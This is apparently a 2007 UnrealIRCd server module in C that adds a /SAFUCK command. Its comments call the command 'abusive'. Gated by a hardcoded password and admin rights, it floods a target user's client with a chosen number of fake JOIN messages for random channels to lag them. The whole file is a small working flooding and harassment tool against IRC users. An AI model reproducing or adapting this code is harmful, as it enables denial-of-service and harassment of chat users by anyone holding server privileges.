/*
 * lol  - m_safuck.c (c)
 *
 * force join a user into x number of channels
 * in a short period of time. abusive, plz.
 *
 */
#include "config.h"
#include "struct.h"
#include "common.h"
#include "sys.h"
#include "numeric.h"
#include "msg.h"
#include "proto.h"
#include "channel.h"
#include <time.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef _WIN32
#include <io.h>
#endif
#include <fcntl.h>
#include "h.h"
#ifdef STRIPBADWORDS
#include "badwords.h"
#endif
#ifdef _WIN32
#include "version.h"
#endif

#undef NOTIFYOPS
#undef LOGIT
#define NOTIFYOPS
#define LOGIT

DLLFUNC CMD_FUNC(m_safuck);

#define MSG_SAFUCK 	"SAFUCK"
#define SAFPASS 	"EXTRASUPERPASSWORDHERE"
#define TOK_SAFUCK 	"SAF"	

static Command *safuck;

ModuleHeader MOD_HEADER(m_safuck)
  = {
	"m_safuck",
	"$Id: m_safuck.c,v 1.1 2007/09/04 15:15:22 Resident Exp $",
	"command /safuck", 
	"3.2-b8-1",
	NULL 
    };

DLLFUNC int MOD_INIT(m_safuck)(ModuleInfo *modinfo)
{
	safuck = CommandAdd(modinfo->handle, MSG_SAFUCK, TOK_SAFUCK, 
m_safuck, MAXPARA, M_USER|M_SERVER);
	return MOD_SUCCESS;
}

DLLFUNC int MOD_LOAD(m_safuck)(int module_load)
{
	return MOD_SUCCESS;
}

DLLFUNC int MOD_UNLOAD(m_safuck)(int module_unload)
{
	CommandDel(safuck);
	return MOD_SUCCESS;
}

/*
 * m_safuck
 *
 * parv[0] = prefix
 * parv[1] = target
 * parv[2] = number of channels
 *
 */

DLLFUNC CMD_FUNC(m_safuck)
{
	aClient *acptr;
	int i = 0;

	//not going to really put them in the channels,
	//instead just send :%s JOIN %s to lag them up.

	if (!IsSAdmin(sptr) && MyClient(sptr))
	{
		sendto_one(sptr, err_str(ERR_NOPRIVILEGES), me.name, 
sptr->name);
		return 0;
	}
	if (parc < 3)
	{
		sendto_one(sptr, err_str(ERR_NEEDMOREPARAMS), me.name, 
sptr->name,
			"SAFUCK");
		return 0;
	}
	if (!(acptr = find_client(parv[1],NULL)))
	{
		sendto_one(sptr, err_str(ERR_NOSUCHNICK), me.name, 
parv[0],
			parv[1]);
		return 0;
	}
	if (atoi(parv[2]) <= 0)
	{
		sendnotice(sptr, "*** SAFuck - Cannot join user to %s 
channels",
			parv[2]);
		return 0;
	}
	if (!MyClient(acptr))
	{
		sendto_serv_butone_token(cptr, sptr->name, MSG_SAFUCK, 
TOK_SAFUCK,
			"%s %s %s", acptr->name, parv[2], parv[3]);
		return 0;
	}
	if (BadPtr(parv[3]) || match(parv[3],SAFPASS))
		return 0; 
	for (i; i < atoi(parv[2]); i++)
		sendto_one(acptr, ":%s JOIN #%d", acptr->name,
			getrandom32());

#ifdef NOTIFYOPS
	sendto_snomask(SNO_EYES, "*** SAFuck - %s used SAFUCK to force 
%s into %s channels.",
		sptr->name, acptr->name, parv[2]);
#endif
#ifdef LOGIT
	ircd_log(LOG_SACMDS, "SAFUCK: %s used SAFUCK to force %s (%s@%s) 
into %s channels.",
		sptr->name, acptr->name, acptr->user->username, 
acptr->user->realhost, parv[2]);
#endif
	return 0;
}
